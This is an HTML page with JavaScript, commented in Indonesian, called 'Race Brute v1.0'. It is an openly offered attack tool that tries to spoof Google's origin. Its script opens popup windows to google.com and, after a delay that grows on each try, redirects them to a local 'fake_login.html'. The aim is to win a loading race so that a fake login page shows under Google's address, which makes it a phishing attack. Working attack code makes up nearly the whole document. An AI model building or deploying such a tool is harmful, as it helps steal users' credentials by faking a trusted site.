<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Timing Bruteforce - FARISSAL B</title>
    <style>
        body { background: #000; color: #fff; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .panel { background: #111; border: 1px solid #333; padding: 25px; border-radius: 15px; width: 80%; max-width: 400px; }
        button { background: #d93025; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-bottom: 15px; }
        .stat { color: #81c995; font-size: 12px; text-align: left; }
    </style>
</head>
<body>

<div class="panel">
    <h2 style="color: #8ab4f8; margin-top:0;">Race Brute v1.0</h2>
    <p style="font-size: 11px; color: #9aa0a6;">Target: google.com Origin Spoofing</p>
    
    <button id="bruteBtn">START ATTACK LOOP</button>
    
    <div id="status" class="stat">> System idle...</div>
</div>

<script>
    const status = document.getElementById('status');
    const log = (m) => { status.innerHTML = `> ${m}<br>` + status.innerHTML; };

    // Target yang mau dipalsukan URL-nya
    const TARGET_ORIGIN = "https://www.google.com";
    // Halaman lo yang berisi konten palsu
    const ATTACKER_PAGE = window.location.href + "fake_login.html";

    let delay = 50; // Mulai dari 50ms

    document.getElementById('bruteBtn').addEventListener('click', () => {
        log("Starting Bruteforce Attack...");
        
        // Loop 10 kali percobaan dengan timing berbeda
        let count = 0;
        const interval = setInterval(() => {
            if (count >= 10) {
                clearInterval(interval);
                log("Attack batch finished.");
                return;
            }

            log(`Trying with delay: ${delay}ms...`);
            
            // 1. Buka Target
            const win = window.open(TARGET_ORIGIN, "_blank", "width=400,height=500");

            if (win) {
                // 2. Kirim perintah navigasi balik tepat di tengah proses loading
                setTimeout(() => {
                    try {
                        win.location.href = ATTACKER_PAGE;
                    } catch(e) {}
                }, delay);
                
                delay += 50; // Naikin jeda buat percobaan berikutnya
                count++;
            } else {
                log("ERROR: Pop-up blocked!");
                clearInterval(interval);
            }
        }, 2000); // Jeda tiap buka jendela baru biar gak nge-hang
    });
</script>

</body>
</html>
